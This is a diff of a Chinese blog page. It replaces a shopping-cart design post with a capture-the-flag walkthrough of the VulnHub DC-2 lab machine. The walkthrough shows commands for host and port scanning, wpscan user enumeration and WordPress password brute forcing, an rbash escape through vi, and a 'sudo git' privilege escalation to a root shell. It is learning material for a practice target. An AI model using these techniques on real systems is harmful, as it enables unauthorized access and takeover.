@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="商城项目设计, PlayZG">
+    <meta name="keywords" content="VulnHub DC-2, PlayZG">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>商城项目设计 | PlayZG</title>
+    <title>VulnHub DC-2 | PlayZG</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -315,7 +315,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">商城项目设计</h1>
+                    <h1 class="description center-align post-title">VulnHub DC-2</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%95%86%E5%9F%8E%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/">
-                                <span class="chip bg-color">商城项目设计</span>
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
                             </a>
                         
                     </div>
@@ -447,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-24
+                    2021-10-04
                 </div>
                 
 
@@ -456,7 +456,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    757
                 </div>
                 
 
@@ -473,73 +473,71 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="商城项目方案"><a href="#商城项目方案" class="headerlink" title="商城项目方案"></a>商城项目方案</h2><hr>
-<p>布局、规划</p>
-<p>1、设计购物车接口</p>
+                <h1 id="VulnHub-DC-2靶机学习"><a href="#VulnHub-DC-2靶机学习" class="headerlink" title="VulnHub DC-2靶机学习"></a>VulnHub DC-2靶机学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre class=" language-php"><code class="language-php">└─<span class="token shell-comment comment"># arp-scan -l</span>
+<span class="token keyword">Interface</span><span class="token punctuation">:</span> eth0<span class="token punctuation">,</span> type<span class="token punctuation">:</span> <span class="token constant">EN10MB</span><span class="token punctuation">,</span> <span class="token constant">MAC</span><span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span>0c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">,</span> IPv4<span class="token punctuation">:</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.17</span>
+Starting arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token punctuation">.</span><span class="token number">7</span> with <span class="token number">256</span> <span class="token function">hosts</span> <span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//github.com/royhills/arp-scan)</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.2</span>    <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span>ef<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token number">30</span>       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.36</span>   <span class="token number">00</span><span class="token punctuation">:</span>0c<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span>ba<span class="token punctuation">:</span>2b       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.254</span>  <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span>e2<span class="token punctuation">:</span>8a<span class="token punctuation">:</span>ce       VMware<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span></code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>nmap -sV -T4 -A 192.168.20.36</strong></p>
+<p><img src="https://i.loli.net/2021/10/04/GnoEwRt4lyueCsP.png" alt="1.png"></p>
+<p>访问<code>80</code>端口，访问失败，配置<code>hosts</code></p>
+<pre class=" language-php"><code class="language-php">vim <span class="token operator">/</span>etc<span class="token operator">/</span>hosts
+<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">20.36</span>  dc<span class="token number">-2</span></code></pre>
+<p>查看网站的信息是<code>WordPress</code>搭建的站点</p>
+<p><img src="https://i.loli.net/2021/10/04/1WYQthOKf5RneXD.png" alt="2.png"></p>
+<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>一顿乱点在博客中找到<code>Flag1</code></p>
+<p><img src="https://i.loli.net/2021/10/04/BCnak617pKlYWuI.png" alt="3..png"></p>
+<p>根据<code>Flag1</code>提示猜测，如果需要<code>cewl</code>生成字典并进行爆破的话，应该是有个类似登录功能的</p>
+<p>用<code>dirsearch</code>进行扫描：</p>
+<p><img src="https://i.loli.net/2021/10/04/WwyeMoLEdSkZtQf.png" alt="4.png"></p>
+<p><code>/wp-admin/</code>是后台的登录页面</p>
+<p><strong>cewl</strong></p>
+<p>使用<code>cewl</code>生成字典</p>
 <blockquote>
-<p>项目背景： 多商户商城、商品多规格、多个购物车</p>
+<p><strong>Cewl</strong><br>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似<code>John the Ripper</code>这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>
 </blockquote>
+<pre class=" language-php"><code class="language-php">cewl http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//dc-2 -w wordpress_pass.txt   </span></code></pre>
+<p><strong>wpscan</strong></p>
 <blockquote>
-<p>方案：<br>    - 存储介质【Session，Cookie，文件，数据库，Redis】<br>    - 多购物车的实现需要将购物车分片，说白了就是加个代表不同购物车的标识，最好直接在类顶部定义好不同区域的分片标识<br>    - 确定一个用户的一个购物车  需要 购物车分片标识+用户唯一标识  共同确定<br>    - 购物车中商品如何认定为一个独立的个体？    按店铺*商品规格这两个共同确定，两个都一致才是一个商品<br>    - 一般判断库存是否足够是在加入购物车前和提交订单部分，购物车内部更改数量无需判断库存</p>
-<blockquote>
-<p>session：保存在服务的端，用户多了会占用资源，用户退出会丢失，不持久</p>
-<p>cookie：保存在客户端，用户必须启用，有大小限制，单条4k，不安全，不持久</p>
-<p>文件：读写效率不高，占资源</p>
-<p>数据库：占用数据库资源</p>
-<p>Redis：读写效率高，可持久（半持久【定期快照，成功后覆盖原文件，单文件，适合迁移，启动效率高，缺点是会丢数据，dump过程中宕机，未写入的会丢失 eg. 在900秒(15分钟)之后，如果至少有1个key发生变化，则dump内存快照。】，全持久【追加日志，每有一个操作，都会追加一条日志，对日志 ① #每次有数据修改发生时都会写入AOF文件。②每秒钟同步一次，该策略为AOF的缺省策略。③ 从不同步。高效但是数据不会被持久化。】）</p>
-<p>两者之间的选择是性能和数据一致性之间的选择。</p>
-<p>redis存的数据一定不是重要数据。</p>
+<p><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。</p>
 </blockquote>
-<ul>
-<li>接口：（Redis很容易实现）<ul>
-<li>获取购物车全量数据（需要同时获取所有商品的规格及笛卡尔积的规格特性，前台做笛卡尔积与接口数据对比）</li>
-<li>购物车添加/减少N件商品（添加时如果目标已存在，在原来基础上更新加）<ul>
-<li>更新购物车中单件商品的SKU（如果目标已存在，需要合并）</li>
-<li>从购物车中删除单种商品</li>
-<li>清空购物车</li>
-<li>购物车是否存在某商品</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</blockquote>
-<p>2、商品规格部分的表设计及前后台功能实现</p>
-<blockquote>
-<ul>
-<li>一种是在小分类上挂属性名，便利，同一小分类下的商品功能相近，属性相近，可以在添加属性时候直接在分类挂靠的属性中选择或者添加补充。</li>
-</ul>
-<p>eg. 衣服类的尺码、颜色<br><code>手机类的颜色、内存、屏幕尺寸等 </code></p>
-<ul>
-<li>一种是直接在商品上挂属性名，灵活，添加繁琐，需要每个商品单独添加属性和属性值</li>
-</ul>
-</blockquote>
-<blockquote>
-<p>按第二种的简单实现：</p>
-<p>商品表的基础上需要附带两个表，一个属性表，一个属性值表。</p>
-<p>属性表：商品id，属性名              商品对属性表一对多</p>
-<p>属性值表：属性id，属性值名       属性表对属性值表一对多</p>
-</blockquote>
-<blockquote>
-<p>后台：</p>
-<p>优雅的做法：</p>
-<p><code>属性和属性值一般在一个页面上，而不是独立的，每次提交到后台，需要同时对两个表处理，后台需要对这些传过来的数据分类，哪些是增加的，那些是删除的，哪些是修改的，不同的分类做不同的处理。</code></p>
-<p>暴力的做法：</p>
-<p><code>就是每次提交都将关联该商品的所有属性及属性值全干掉，每次提交都是添加。</code></p>
-</blockquote>
-<blockquote>
-<p>前台：</p>
-<p>前台用到的地方就是商品详情页及购物车内，我们需要向前端返回该商品涉及到的所有属性及属性值，以及所有组合的商品规格特性一同返回，前台将用户的选择组合起来，从我们返回的列表中去查询该规格。</p>
-<p>前台在提交订单时，需要去判断该规格是否存在库存。</p>
-</blockquote>
-<p>3、多商户商城提交订单需要注意的点</p>
-<blockquote>
-<p>正常来说从商品详情页/购物车到提交订单中间有一步确认订单，如果不正常，没有这一步，就需要在提交订单订单这一步处理确认订单该做的事。</p>
-<p>这一步会牵扯到 购物车和商品页提交过来的数据合法性校验（提交过来的是商品id和数量，商品价格是要自己拿id再去查的）、用户收货地址、优惠券、各规格库存校验、按店铺拆单、确定本次支付金额</p>
-<p>为了数据完整性，不建议硬删除。</p>
-<p>订单主表、订单明细表、订单支付表、规格表</p>
-<p>防止重复提交订单 前后端都需要处理 | 前端提交一次后置灰 | 后端拦截器，判断提交频率、用户每打开提交订单页面从后台获取一个token与用户绑定，用一次后失效掉，而且判断这个token是否有效是要加锁的。</p>
-</blockquote>
+<p>先列举用户</p>
+<pre class=" language-php"><code class="language-php">wpscan <span class="token operator">--</span>url http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//dc-2 --enumerate u</span></code></pre>
+<p><img src="https://i.loli.net/2021/10/04/lXLt4NYnzwD58fI.png" alt="5.png"></p>
+<p>发现有<code>admin</code>，<code>jerry</code>，<code>tom</code>三个用户，然后利用<code>cewl</code>生成的字典跟<code>wpscan</code>进行暴力破解</p>
+<pre class=" language-php"><code class="language-php">wpscan <span class="token operator">--</span>url http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//dc-2 -e u --passwords /home/z/Desktop/passwd/wordpress_pass.txt  </span></code></pre>
+<p><img src="https://i.loli.net/2021/10/04/1yYgVd29suCcivx.png" alt="7.png"></p>
+<p>得到<code>jerry</code>，<code>tom</code>的密码，在网站后台尝试登录</p>
+<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>使用<code>jerry</code>登录后台能看到<code>Flag2</code>，这里<code>tom</code>看不到，感觉<code>jerry</code>权限比<code>tom</code>权限还要大一点</p>
+<p><img src="https://i.loli.net/2021/10/04/ExB7Ch1pDFQMTKk.png" alt="8.png"></p>
+<p><code>Flag2</code>提示：如果<strong>WordPress</strong>行不通的话，要换另一种方式</p>
+<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>重新扫描端口，发现<code>7744</code>端口</p>
+<p><img src="https://i.loli.net/2021/10/05/HMO9lGfKs62veQb.png" alt="9.png"></p>
+<p><code>7744</code>端口是<code>ssh</code>服务，用爆破的账号登录试一下，<code>tom</code>用户可以登录上去，但是<code>jerry</code>不能登录</p>
+<p>登录之后发现根目录下面有个<code>flag3.txt</code>，大部分的命令不能用，可以用<code>vi</code>查看内容</p>
+<pre class=" language-php"><code class="language-php">oor old Tom is always running after Jerry<span class="token punctuation">.</span> Perhaps he should su <span class="token keyword">for</span> all the stress he causes<span class="token punctuation">.</span></code></pre>
+<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><p>猜测跟<code>jerry</code>用户有关，但是<code>jerry</code>不知道密码而且大部分命令也不好用，没办法<code>cd </code>到<code>jerry</code>用户的家目录。</p>
+<p>利用<code>vi</code>然后绕过<strong>RBash</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#进入`vi`之后执行</span>
+<span class="token punctuation">:</span>set shell<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
+<span class="token shell-comment comment">#然后再执行</span>
+<span class="token punctuation">:</span>shell
+<span class="token shell-comment comment">#之后执行命令 会出现bash: cat: command not found，添加环境变量（执行下面的那条命令）</span>
+export <span class="token constant">PATH</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>bin</code></pre>
+<p>通过<code>/etc/passwd</code>可以看到系统存在<code>jerry</code>用户，并且利用<code>su</code>命令切换到<code>jerry</code>用户</p>
+<p><img src="https://i.loli.net/2021/10/05/Z4cWxLjyPJ8dDg1.png" alt="10.png"></p>
+<p>利用<code>cd</code>命令进入<code>jerry</code>用户的家目录并发现<code>Flag4.txt</code></p>
+<p><img src="https://i.loli.net/2021/10/05/ztCeVlYWdrynkMO.png" alt="11.png"></p>
+<p><code>Flag4</code>的意思是根据<strong>git</strong>命令提权</p>
+<pre class=" language-php"><code class="language-php">sudo git help config
+    <span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash或者！<span class="token string">'sh'</span>完成提权
+sudo git  <span class="token operator">-</span>p help
+    <span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash</code></pre>
+<p><img src="https://i.loli.net/2021/10/05/LfNu9dMcICFpngx.png" alt="12.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://cloud.tencent.com/developer/article/1680551</code></p>
+<p><code>https://www.cnblogs.com/zaqzzz/p/12075132.html</code></p>
+<p><code>https://www.freebuf.com/articles/system/188989.html</code></p>
 
                 
             </div>
@@ -566,7 +564,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/01/24/%E5%95%86%E5%9F%8E%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/">http://example.com/2021/01/24/%E5%95%86%E5%9F%8E%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/</a>
+                    <a href="http://example.com/2021/10/04/DC-2/">http://example.com/2021/10/04/DC-2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -604,8 +602,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%95%86%E5%9F%8E%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/">
-                                    <span class="chip bg-color">商城项目设计</span>
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
                                 </a>
                             
                         </div>
@@ -775,17 +773,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/01/24/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                <a href="/2021/10/04/DC-2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="SSRF漏洞学习">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="VulnHub DC-2">
                         
-                        <span class="card-title">SSRF漏洞学习</span>
+                        <span class="card-title">VulnHub DC-2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -795,9 +794,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -806,11 +805,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SSRF/">
-                        <span class="chip bg-color">SSRF</span>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
@@ -824,13 +824,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/01/24/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                <a href="/2021/10/04/DC-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="XXE漏洞学习">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="VulnHub DC-1">
                         
-                        <span class="card-title">XXE漏洞学习</span>
+                        <span class="card-title">VulnHub DC-1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -841,7 +841,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-04
                             </span>
                         <span class="publish-author">
                             
@@ -854,8 +854,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/XXE/">
-                        <span class="chip bg-color">XXE</span>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
